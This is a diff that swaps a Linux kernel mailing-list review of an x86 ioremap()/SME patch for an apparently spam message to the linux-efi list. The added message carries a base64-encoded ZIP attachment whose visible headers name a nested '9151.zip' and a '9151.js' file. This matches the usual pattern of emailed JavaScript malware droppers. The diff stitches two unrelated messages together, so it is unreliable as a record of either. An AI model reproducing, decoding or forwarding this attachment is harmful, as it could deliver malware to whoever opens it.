@@ -1,73 +1,112 @@
-From: Brian Gerst <brgerst@gmail.com>
-Subject: Re: [PATCH v9 07/38] x86/mm: Remove phys_to_virt() usage in ioremap()
-Date: Sat, 8 Jul 2017 08:57:27 -0400
-Message-ID: <CAMzpN2h=AAF6OVfeGJnf5va2Msmd_BPU5BrVENvs0zGQtRMdzQ@mail.gmail.com>
-References: <20170707133804.29711.1616.stgit@tlendack-t1.amdoffice.net> <20170707133925.29711.39301.stgit@tlendack-t1.amdoffice.net>
+From: <iker-KvP5wT2u2U0@public.gmane.org>
+Subject: (unknown)
+Date: Sun, 09 Jul 2017 20:52:43 -0000
+Message-ID: <149963356307.5362.4147576465474473910@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Return-path: <owner-linux-mm@kvack.org>
-In-Reply-To: <20170707133925.29711.39301.stgit@tlendack-t1.amdoffice.net>
-Sender: owner-linux-mm@kvack.org
-To: Tom Lendacky <thomas.lendacky@amd.com>
-Cc: linux-arch <linux-arch@vger.kernel.org>, linux-efi@vger.kernel.org, kvm@vger.kernel.org, linux-doc@vger.kernel.org, the arch/x86 maintainers <x86@kernel.org>, kexec@lists.infradead.org, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, kasan-dev@googlegroups.com, xen-devel@lists.xen.org, Linux-MM <linux-mm@kvack.org>, iommu@lists.linux-foundation.org, Brijesh Singh <brijesh.singh@amd.com>, Toshimitsu Kani <toshi.kani@hpe.com>, =?UTF-8?B?UmFkaW0gS3LEjW3DocWZ?= <rkrcmar@redhat.com>, Matt Fleming <matt@codeblueprint.co.uk>, Alexander Potapenko <glider@google.com>, "H. Peter Anvin" <hpa@zytor.com>, Larry Woodman <lwoodman@redhat.com>, Jonathan Corbet <corbet@lwn.net>, Joerg Roedel <joro@8bytes.org>, "Michael S. Tsirkin" <mst@redhat.com>, Ingo Molnar <mingo@redhat.com>, Andrey Ryabinin <aryabinin@virtuozzo.com>, Dave Young <dyoung@redhat.com>, Rik
+Content-Type: application/zip; name="540211.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-efi-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Subject: 
+Content-Disposition: attachment
+Sender: linux-efi-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+To: linux-efi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: linux-efi@vger.kernel.org
 
-On Fri, Jul 7, 2017 at 9:39 AM, Tom Lendacky <thomas.lendacky@amd.com> wrote:
-> Currently there is a check if the address being mapped is in the ISA
-> range (is_ISA_range()), and if it is, then phys_to_virt() is used to
-> perform the mapping. When SME is active, the default is to add pagetable
-> mappings with the encryption bit set unless specifically overridden. The
-> resulting pagetable mapping from phys_to_virt() will result in a mapping
-> that has the encryption bit set. With SME, the use of ioremap() is
-> intended to generate pagetable mappings that do not have the encryption
-> bit set through the use of the PAGE_KERNEL_IO protection value.
->
-> Rather than special case the SME scenario, remove the ISA range check and
-> usage of phys_to_virt() and have ISA range mappings continue through the
-> remaining ioremap() path.
->
-> Signed-off-by: Tom Lendacky <thomas.lendacky@amd.com>
-> ---
->  arch/x86/mm/ioremap.c |    7 +------
->  1 file changed, 1 insertion(+), 6 deletions(-)
->
-> diff --git a/arch/x86/mm/ioremap.c b/arch/x86/mm/ioremap.c
-> index 4c1b5fd..bfc3e2d 100644
-> --- a/arch/x86/mm/ioremap.c
-> +++ b/arch/x86/mm/ioremap.c
-> @@ -13,6 +13,7 @@
->  #include <linux/slab.h>
->  #include <linux/vmalloc.h>
->  #include <linux/mmiotrace.h>
-> +#include <linux/mem_encrypt.h>
->
->  #include <asm/set_memory.h>
->  #include <asm/e820/api.h>
-> @@ -106,12 +107,6 @@ static void __iomem *__ioremap_caller(resource_size_t phys_addr,
->         }
->
->         /*
-> -        * Don't remap the low PCI/ISA area, it's always mapped..
-> -        */
-> -       if (is_ISA_range(phys_addr, last_addr))
-> -               return (__force void __iomem *)phys_to_virt(phys_addr);
-> -
-> -       /*
->          * Don't allow anybody to remap normal RAM that we're using..
->          */
->         pfn      = phys_addr >> PAGE_SHIFT;
->
-
-Removing this also affects 32-bit, which is more likely to access
-legacy devices in this range.  Put in a check for SME instead
-(provided you follow my recommendations to not set the SME feature bit
-on 32-bit even when the processor supports it).
-
---
-Brian Gerst
-
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+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
